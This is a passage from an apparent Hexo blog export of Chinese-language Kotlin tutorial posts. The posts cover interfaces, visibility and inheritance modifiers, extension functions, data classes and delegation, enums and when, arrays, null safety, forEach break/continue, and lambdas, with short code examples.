function_">get</span><span class="params">()</span> = sb</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<em><strong>接口的使用还有一个问题：</strong></em><br>当两个接口，A，B都实现了showC的方法，而且都带有方法体。问：D类实现了A,B接口。那么D中使用showC会调用谁的方法？<br>答：任何一个都不会，而是会编译报错<br>即，如果同样的继承成员有不止一个实现，必须提供一个显式实现。<br>Kotlin编译器强制要求你提供自己重写的方法：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>&#123;</span><br><span class="line">	override fun <span class="title function_">showC</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="built_in">super</span>&lt;A&gt;.showC()</span><br><span class="line">		<span class="built_in">super</span>&lt;B&gt;.showC()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
在kotlin中，他也可以使用super的关键字，但是需要选定基类，也就是super&lt;&gt;的尖括号中，需要填写基类。</li>
</ul>
<h2 id="控制继承的修饰符"><a href="#控制继承的修饰符" class="headerlink" title="控制继承的修饰符"></a>控制继承的修饰符</h2><table>
<thead>
<tr>
<th>修饰符</th>
<th>相关成员</th>
<th>评注</th>
</tr>
</thead>
<tbody><tr>
<td>final</td>
<td>不能被重写</td>
<td>类中成员默认使用</td>
</tr>
<tr>
<td>open</td>
<td>可以被重写</td>
<td>需要明确的表明，且open的属性会被继承</td>
</tr>
<tr>
<td>abstract</td>
<td>必须被重写</td>
<td>只能在抽象类中使用，抽象成员不能有实现</td>
</tr>
<tr>
<td>override</td>
<td>重写父亲或接口中的成员</td>
<td>如果没有使用final表明，重写的方法默认是开放的</td>
</tr>
</tbody></table>
<h2 id="可见性修饰符"><a href="#可见性修饰符" class="headerlink" title="可见性修饰符"></a>可见性修饰符</h2><table>
<thead>
<tr>
<th align="left">修饰符</th>
<th align="left">类成员</th>
<th align="left">顶层声明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">public（默认）</td>
<td align="left">所有地方可见</td>
<td align="left">所有地方可见</td>
</tr>
<tr>
<td align="left">internal</td>
<td align="left">模块中可见</td>
<td align="left">模块中可见</td>
</tr>
<tr>
<td align="left">protected</td>
<td align="left">子类中可见</td>
<td align="left">–</td>
</tr>
<tr>
<td align="left">private</td>
<td align="left">类中可见</td>
<td align="left">文件中可见</td>
</tr>
</tbody></table>
<p>对于kotlin和java的区别：</p>
<ol>
<li>kotlin中没有默认类，或者说它默认就是public所有地方可见。</li>
<li>internal是新增的修饰符，他表示在一个模块中可见，这个模块可以是指一个idea项目，eclipse项目，maven，ant项目。也就是同一个项目中可见</li>
<li>protected对于java而言是同一个包内可见，而kotlin中化简为只在子类中可见。</li>
</ol>
<p>然后在kotlin中，不允许可见度高的去调用可见度低的方法，如public不能调用internal，以此类推，保持一致。同样的外部类也不能看见内部类，如扩展函数是无法看到内部的protected，private方法的，保持了类的封闭性。</p>
<h3 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h3><p>在jvm编译过程中，kotlin被编译为字节码文件时，public，protected，private被编译成java字节码时会被保留，他们也保持了同样的可见性。例外：private会被编译成类包私有声明，因为在java中，不能把类声明为private。</p>
<p>internal会被编译成public。</p>
<p><strong>提出疑问？</strong><br>因为kotlin在编译为字节码后，和java的交互中，会有一些你在java中能访问，但是在kotlin中不能访问的内容，如：<code>protected</code>，在java的同一个包下能访问，但是kotlin中不能访问。这会导致什么？？</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin扩展函数</title>
    <url>/posts/fb49738c/</url>
    <content><![CDATA[<h1 id="Kotlin的又一大特色"><a href="#Kotlin的又一大特色" class="headerlink" title="Kotlin的又一大特色"></a>Kotlin的又一大特色</h1><ul>
<li><p>给别人的类添加扩展函数和属性<br>当我们在一个现有的java或者android项目中，需要添加kotlin的代码，而我们又不能把java等之类的代码全部转重写成kotlin，那会大大降低效率，而kotlin的扩展函数就很好的解决了这个办法。<br>例如:我要获取字符串的最后一个字符：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    println(<span class="string">&quot;kotlin&quot;</span>.lastChar())</span><br><span class="line">&#125;</span><br><span class="line">fun String.lastChar(): Char = <span class="built_in">this</span>.get(<span class="built_in">this</span>.length-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>结果为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>
<p>在上述演示中，<code>String</code>表示接受类型，<code>”kotlin“</code>表示接受者对象，也就是接受类型的具体实例。然后，<code>lastChar</code>就是扩展的函数名，后面则是一个表达式体。<br>这样子，就算为莫个类扩展了方法和属性。<br><strong>而且，不只是kotlin中，所有java，scale或者Groovy之类的JVM语言编写的都会被编译为java类，也就是都可以为这个类添加扩展。</strong><br>而且对于扩展函数而言，他就和其他成员变量一样，可以直接使用类中的方法，也就是默认在ths下。因此可以省略他，如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun String.lastChar(): Char = get(length-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但是扩展函数是在类之外定义的函数，他不能破坏类的封装性，所以相对于成员变量而言，扩展函数并不能访问私有或者受保护的变量。</p>
</blockquote>
</li>
<li><p>扩展函数也需要从外部导入<br>扩展函数并不会自动的在全局生效，尽管智能的IDE会帮你自动导入，但是你仍然需要明白，你必须通过<code>import strings.lastChar</code>类似上述模板的样子来导入方法。</p>
</li>
<li><p>从java中调用扩展函数<br>以上述的扩展函数为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> StringUtilKt.lastChar(<span class="string">&quot;JAVA&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这里，StringUtilKt是指包含这个属性的包名。从java中调用扩展函数时，他就和调用静态方法一样，只是这个接受者对象需要作为第一个参数传递到该方法中。形式如上。</p>
</li>
<li><p>扩展函数不能重写<br>因为在通过JVM编译后，他实际上会被转化为静态函数，所以扩展函数重写并没有什么意义，如果重写了该方法，最后调用该方法只取决于是否该对象的静态类型，而不是他的运行时类型<br>如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">open <span class="keyword">class</span> <span class="title class_">A</span>(val a: String) &#123;</span><br><span class="line">    fun <span class="title function_">showA</span><span class="params">()</span> &#123;</span><br><span class="line">        println(a)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AA</span>(a:String):A(a)&#123;</span><br><span class="line">&#125;</span><br><span class="line">fun A.showDoubleA() &#123;</span><br><span class="line">    println(a)</span><br><span class="line">    println(a)</span><br><span class="line">&#125;</span><br><span class="line">fun AA.showDoubleA() &#123;</span><br><span class="line">    println(a)</span><br><span class="line">    println(a)</span><br><span class="line">    println(a)</span><br><span class="line">&#125;</span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    val test:A = AA(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    test.showDoubleA() </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出结果为22</span></span><br></pre></td></tr></table></figure></li>
<li><p>扩展属性<br>除了扩展方法外，你也可以扩展属性<br>但是同样的，他会在JVM编译器中转化为静态属性，<br>如果你定义的是val方法，那么这个属性将是不可变的，你需要自己去定义他的get方法，<br>如果用var去定义，那你同时需要定义他的get和set方法。<br><strong>因为他没有默认支持的字段，也没有默认的get方法，同理，初始化也不可以，因为没有地方存储初始值</strong><br>通过java来调用扩展属性的话，必须使用get和set方法来获取，不能直接操作属性</p>
</li>
</ul>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin数据类和委托</title>
    <url>/posts/8293f6c6/</url>
    <content><![CDATA[<h2 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h2><p>简单点说：使用<code>data class</code>关键字，声明一个数据类，该类会帮你自动重写<code>toString()</code>,<code>equal()</code>,<code>HashCode()</code>方法。<br>通常来说，数据类的属性都是val的，即不可改变。因为通常创建数据类用于持续化数据维持，或者作为HashMap的一个键使用。而改变数据类的属性都会导致他本身失去意义。因此，kotlin为你提供了一个方法可以<code>copy()</code>本身。同时也可以修改某些属性值。</p>
<h2 id="类委托"><a href="#类委托" class="headerlink" title="类委托"></a>类委托</h2><p><strong>使用by关键字。</strong><br>一个类的方法不在该类中定义，而是直接委托给另一个对象来处理。</p>
<h4 id="修饰器模式"><a href="#修饰器模式" class="headerlink" title="修饰器模式"></a>修饰器模式</h4><p>这种模式的本质就是创建一个新类，实现与原始类一样的接口并将原来的类的实例作为一个字段保存。与原始类拥有同样行为的方法不用被修改，只需要直接转发到原始类的实例。<br>简单点说就是给原始类<em>套了一层壳</em>，然后所有的接口的法方法直接转交给原始类去完成，只不过可以添加一些自定义的新方法，或者重写一部分的方法。<br>如果在java中去实现，也没有问题，只是需要重复写很多的模板代码。<br>而在kotlin中，他通过<code>by</code>关键字实现类委托。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Child</span>&#123;</span><br><span class="line">    fun <span class="title function_">walk</span><span class="params">()</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;我会走路&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:Child&#123;</span><br><span class="line">    fun <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;我会叫&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class Teacher( child: Child = Student()):Child by child</span></span><br><span class="line"><span class="comment">//现场创建一个类继承Child</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>( child: Child = object:Child&#123;&#125;):Child by child</span><br><span class="line"><span class="comment">//用一个单例去实现</span></span><br><span class="line"><span class="comment">//当然在正常使用时。这里你可以直接传递一个参数进去，用来使用</span></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Teacher().walk()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><ol>
<li>如果这里重写了他的方法，是会将原始类的方法重写，还是只重写当前的类中的方法，于是做以下探究<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>(val child: Child = object:Child&#123;&#125;):Child by child&#123;</span><br><span class="line">    override fun <span class="title function_">walk</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.walk()</span><br><span class="line">        println(<span class="string">&quot;干嘛&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用一个单例去实现</span></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Teacher().walk()</span><br><span class="line">    Teacher().child.walk()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
结果为：<img src="https://image.zfxt.top/hexo-blog/kotlin%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%92%8C%E5%A7%94%E6%89%98-2023-07-11-50-47.png"><br>也就是他并没有重写该类的方法，而是在底层自动将委托类的方法都模板套入了一遍。</li>
</ol>
<h2 id="对象委托"><a href="#对象委托" class="headerlink" title="对象委托"></a>对象委托</h2><p>一个类的属性不在该类中定义，而是直接委托给另一个对象来处理。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="comment">// 被委托属性</span></span><br><span class="line">    <span class="keyword">var</span> prop: String <span class="keyword">by</span> Delegate() <span class="comment">// 基础对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基础类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Delegate</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> _realValue: String = <span class="string">&quot;彭&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">operator</span> <span class="function"><span class="keyword">fun</span> <span class="title">getValue</span><span class="params">(thisRef: <span class="type">Any</span>?, property: <span class="type">KProperty</span>&lt;*&gt;)</span></span>: String &#123;</span><br><span class="line">        println(<span class="string">&quot;getValue&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> _realValue</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">operator</span> <span class="function"><span class="keyword">fun</span> <span class="title">setValue</span><span class="params">(thisRef: <span class="type">Any</span>?, property: <span class="type">KProperty</span>&lt;*&gt;, value: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">        println(<span class="string">&quot;setValue&quot;</span>)</span><br><span class="line">        _realValue = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> e = Example()</span><br><span class="line">    println(e.prop)    <span class="comment">// 最终调用 Delegate#getValue()</span></span><br><span class="line">    e.prop = <span class="string">&quot;Peng&quot;</span>    <span class="comment">// 最终调用 Delegate#setValue()</span></span><br><span class="line">    println(e.prop)    <span class="comment">// 最终调用 Delegate#getValue()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">getValue</span><br><span class="line">彭</span><br><span class="line">setValue</span><br><span class="line">getValue</span><br><span class="line">Peng</span><br></pre></td></tr></table></figure>
<p>基础类不需要实现任何接口，但必须提供 getValue() 方法，如果是委托可变属性，还需要提供 setValue()。在每个属性委托的实现的背后，Kotlin 编译器都会生成辅助属性并委托给它。 例如，对于属性 prop，会生成「辅助属性」 prop$delegate。 而 prop 的 getter() 和 setter() 方法只是简单地委托给辅助属性的 getValue() 和 setValue() 处理。</p>
<h2 id="局部变量委托"><a href="#局部变量委托" class="headerlink" title="局部变量委托"></a>局部变量委托</h2><p>一个局部变量不在该方法中定义，而是直接委托给另一个对象来处理。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> lazyValue: String <span class="keyword">by</span> lazy &#123;</span><br><span class="line">        println(<span class="string">&quot;Lazy Init Completed!&quot;</span>)</span><br><span class="line">        <span class="string">&quot;Hello World.&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span><span class="comment">/*someCondition*/</span>) &#123;</span><br><span class="line">        println(lazyValue) <span class="comment">// 首次调用</span></span><br><span class="line">        println(lazyValue) <span class="comment">// 后续调用</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出：</span><br><span class="line">Lazy Init Completed!</span><br><span class="line">Hello World.</span><br><span class="line">Hello World.</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin枚举类和“WHEN”,in</title>
    <url>/posts/bc432816/</url>
    <content><![CDATA[<h2 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h2><p>在kotlin中，有<code>enum</code>的一个所谓的软关键字，她只在class钱买你才有特殊意义，其他时候都是普通的名称使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">class</span> Color(val r: Int, val g: Int, val b: Int) &#123;</span><br><span class="line">    RED(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">    ORANGE(<span class="number">255</span>, <span class="number">165</span>, <span class="number">0</span>),</span><br><span class="line">    YELLOW(<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>),</span><br><span class="line">    GREEN(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>),</span><br><span class="line">    BLUE(<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"><span class="comment">//如果在枚举类中，有定义任何方法的话，需要将定义的常量后面加上分号来与方法分开</span></span><br><span class="line">    fun <span class="title function_">rgb</span><span class="params">()</span> = (r * <span class="number">256</span> + g) * <span class="number">256</span> + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    println(Color.RED)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RED</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>
<p>&#x2F;&#x2F;如果没有选择方法或者属性字段，她会默认输出他的名字。</p>
<h2 id="when"><a href="#when" class="headerlink" title="when"></a>when</h2><p>一些比较常用的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Color.*</span><br><span class="line"></span><br><span class="line">fun <span class="title function_">getMnemonic</span><span class="params">(color: Color)</span> = </span><br><span class="line">    <span class="keyword">when</span>(color)&#123;</span><br><span class="line">        Color.RED -&gt; <span class="string">&quot;Richard&quot;</span></span><br><span class="line">        <span class="comment">//可以在一个分支上合并多个选项</span></span><br><span class="line">        Color.BLUE,Color.ORANGE -&gt; <span class="string">&quot;MyColor&quot;</span></span><br><span class="line">        <span class="comment">//导入枚举类常量后，可以直接省略Color</span></span><br><span class="line">        YELLOW -&gt; <span class="string">&quot;Yellow&quot;</span></span><br><span class="line">        <span class="keyword">else</span> -&gt; <span class="keyword">throw</span> Exception(<span class="string">&quot;Dirty color&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>when还可以使用任意对象。而且如果when没有传值进入的话，那么他的分支条件就是任意的布尔表达式。<br>when中也不止以上的内容，她同时也可以完成智能转化，如果要添加日志的话，也可以使用代码体格式，代码块中的最后一个表达式将会成为结果返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">eval</span><span class="params">(e:Any)</span> =</span><br><span class="line">    <span class="keyword">when</span>(e)&#123;</span><br><span class="line">        <span class="comment">//kotlin中的智能转化，当他用is判断了数据类型后，他会自动转化为该类型然后继续操作</span></span><br><span class="line">        is String -&gt; <span class="string">&quot;这个判断出错了&quot;</span></span><br><span class="line">        is Int -&gt; &#123;</span><br><span class="line">            <span class="comment">//在使用代码块时，他会将最后一个表达式返回</span></span><br><span class="line">            println(<span class="string">&quot;这个判断没出错&quot;</span>)</span><br><span class="line">            e</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> -&gt; <span class="string">&quot;这个没有结果&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>用in来检查是否在某个区间内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    println(<span class="string">&quot;kotlin&quot;</span> in <span class="string">&quot;java&quot;</span>..<span class="string">&quot;scale&quot;</span>)</span><br><span class="line">    println(<span class="string">&quot;kotlin&quot;</span> in <span class="title function_">setOf</span><span class="params">(<span class="string">&quot;java&quot;</span>,<span class="string">&quot;scale&quot;</span>)</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他的输出是<img src="https://image.zfxt.top/hexo-blog/kotlin%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%92%8C%E2%80%9CWHEN%E2%80%9D,in-2023-06-02-38-37.png"><br>这是因为字符串的比较是按照字母表顺序进行比较的</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin数组初始化</title>
    <url>/posts/e8e0fb17/</url>
    <content><![CDATA[<h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><p>今天在leetcode刷题时，突然发现，自己不会使用最基础的数组以及他的初始化。所以在这里说明一下</p>
<ol>
<li>使用<code>arrayOf()</code>这是官方推荐的一种写法，他接受的时可变长参数，也就是可以接受任意的参数，直接生成一个数组。</li>
<li>使用<code>arrayOfNull&lt;&gt;(n)</code>,初始化一个数组全为空，接受参数为数组的大小。</li>
<li>直接使用<code>Array()</code>生成数组。他又两种构造器</li>
</ol>
<ul>
<li>直接传递一个int，这个就是他的size。</li>
<li>除了传递一个int外，还可以传递一个lambda函数，作为数组的初始值。<br> <img src="https://image.zfxt.top/hexo-blog/kotlin%E6%95%B0%E7%BB%84%E5%88%9D%E5%A7%8B%E5%8C%96-2023-07-15-43-34.png"></li>
</ul>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin空指针</title>
    <url>/posts/8f005380/</url>
    <content><![CDATA[<p>在kotlin中，最为核心的一个内容就是kotlin的空安全判断。他可以通过<code>?</code>来简单的确定是否为空类型<br>而接下来要说明的是<code>let</code>函数，对于任何一个类都继承了该方法。例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">obj.let&#123;obj2? -&gt;</span><br><span class="line">//编写具体的业务逻辑</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，obj对象调用的let函数，后面是lambda表达式，他会直接obj对象本身传递到函数中，就是obj2，<del>如果只有一个参数，也可以直接省略，用it代替</del>。而let的特性让他特别适合处理空指针检查<br>下面示例一个普通的空指针检查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fun doStudy(study: Study?)&#123;</span><br><span class="line">    	if(study != null)&#123;</span><br><span class="line">    		study.readBooks()</span><br><span class="line">    		study.doHomework()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在kotlin中，你用if判断完后，他会自动检测，然后转化为非空的study类，然后就可以正常的调用。<br>而如果使用let的话，就会是下面这种情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fun doStudy(study: Study?)&#123;</span><br><span class="line">    	study?.let&#123;</span><br><span class="line">    		it.readBooks()</span><br><span class="line">    		it.doHomework()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只有当study不是null时，才会执行let内的内容。<br>只有以上内容或许还看不出let的好处。下面再介绍一个<br>let可以处理全局变量的判空问题，而if无法做到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var study: Study? = null</span><br><span class="line">fun doStudy()&#123;</span><br><span class="line">    	if(study !=null)&#123;</span><br><span class="line">    		study.readBooks()</span><br><span class="line">    		study.doHomework()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数再编译时会报错，因为对于全局的变量随时有可能会被其他线程修改。任然无法保证没有空指针风险，而通过let就不会有这种问题了。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin的foreach如何实现break和continue</title>
    <url>/posts/c7f9b665/</url>
    <content><![CDATA[<p>如何在kotin的forEach中实现break和continue？<br><strong>先说结论</strong></p>
<h3 id="break的实现："><a href="#break的实现：" class="headerlink" title="break的实现："></a>break的实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    run&#123;</span><br><span class="line">        (<span class="number">1.</span><span class="number">.10</span>).forEach &#123;</span><br><span class="line">            <span class="keyword">if</span>(it%<span class="number">3</span>==<span class="number">0</span>) <span class="keyword">return</span><span class="meta">@run</span></span><br><span class="line">            println(it)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>这是官方推荐的方法：但是这个实现break的方法有些丑陋，凭空添加一层壳子。<br>而网上有关于类似的做法，比如通过filter或者find预知你要判断的数，但是往往我们的break的地方不能只是在开头或者结尾用来跳过某些数，如<a href="https://zhuanlan.zhihu.com/p/342384584">例子</a><br>而是一些特定的逻辑后，可以结束循环。</p>
<h3 id="continue的实现："><a href="#continue的实现：" class="headerlink" title="continue的实现："></a>continue的实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    (<span class="number">1.</span><span class="number">.10</span>).forEach &#123;</span><br><span class="line">        <span class="keyword">if</span>(it%<span class="number">3</span>==<span class="number">0</span>) <span class="keyword">return</span><span class="meta">@forEach</span></span><br><span class="line">        println(it)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>这个比较好理解，所以不过多解释</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin的private和java的private</title>
    <url>/posts/e71cd076/</url>
    <content><![CDATA[<p>在kotlin中存在</p>
<ol>
<li><p>修饰符<br>1.1. 在 Kotlin 中，修饰符有：open&#x2F;final，private&#x2F;protected&#x2F;internal&#x2F;public<br>1.2 open&#x2F;final：一个类能不能被继承。<br>1.3. private&#x2F;protected&#x2F;internal&#x2F;public：一个类中或 Kotlin 文件中的变量或方法能不能被其他类或其他 Kotlin 文件访问。</p>
</li>
<li><p>open&#x2F;final<br>2.1 一个类在类的定义前加上 open 修饰符才可以被继承。如果没有加 open 关键字，那么默认是 final，即不可被继承的。<br>2.2 被 open 修饰的类中只有被 open 修饰的属性或方法才可以被子类重写，如果在属性或方法前没有加 open 关键字，那么默认是 final，是不可被覆盖重写的。<br>2.3 在子类中覆盖重写父类中的属性或方法是，需要使用关键字 override 修饰。<br>2.4 子类中重写了父类的属性或方法，那么此时子类中的属性或方法没有加 open 关键字，子类的子类也是可以重写的，也就是 override 默认是 open 的。如果不想被子类的子类进行重写，需要显示用 final 修饰。<br>2.5 在 Kotlin 中，接口不需要加上 open 修饰符。接口本身和它内部的方法和属性都是默认加上 open 修饰符的，而普通类默认是加上 final 修饰符。而且在接口中也不能手动加上 final 修饰符，因为接口的作用就是为了抽象，如果不能被赋值或实现，那么接口就没用了。</p>
</li>
<li><p>private&#x2F;protected&#x2F;internal&#x2F;public<br>3.1 这4个修饰符为可见性修饰符。<br>(1) 如果用 private 修饰，那么只能在这个类的内部(包含其所有成员)可见；<br>(2) 如果用 protected 修饰，不但可以在类内部可见，在子类中也可见；<br>(3) 如果用 internal 修饰，则类声明的本模块内的客户端都可见(模块的概念同 Java 中包的概念)；<br>(4) 如果用 public 修饰，则任何地方可见。在 Kotlin 中，如果没有显示指定 private&#x2F;protected&#x2F;internal&#x2F;public 这几个修饰符，那么默认是 public。</p>
</li>
</ol>
<p><img src="https://image.zfxt.top/hexo-blog/kotlin%E7%9A%84private%E5%92%8Cjava%E7%9A%84private-2023-11-05-57-48.png"><br>这就是java和kotlin的一个区别，因此想要实现和java一样的某些功能，我们得使用protected来实现。而不能使用private</p>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin细节（1）if表达式</title>
    <url>/posts/4a01cb33/</url>
    <content><![CDATA[<ol>
<li>在kotlin中，if是表达式，而不是语句。他们的区别是表达式有值，可以作为另一个表达式的一部分使用。而语句没有。</li>
<li>而另一方面，在java中赋值操作是表达式，所以你可以在很多的if判断中看到赋值的出现，而kotlin中赋值操作变成了语句，这样有助于避免比较和赋值的混淆</li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin高级函数和lambda表达式</title>
    <url>/posts/ffe74f54/</url>
    <content><![CDATA[<ol>
<li><p>kotlin的表达式函数体</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	println(add_express(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">	println(add_block(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">	println(add_lambda(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码块体，最完整的函数体</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">fun <span class="title function_">add_block</span><span class="params">(a: Int, b: Int)</span>: Int &#123;</span><br><span class="line">	<span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 表达式体</span></span><br><span class="line"><span class="comment"> * 要求，他的函数体是由单个表达式构成的。</span></span><br><span class="line"><span class="comment"> * 那么她会自动判断返回类型。可以省略掉返回类型，同时需要省略掉花括号和return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">fun <span class="title function_">add_express</span><span class="params">(a: Int, b: Int)</span> = a + b</span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">add_lambda</span> <span 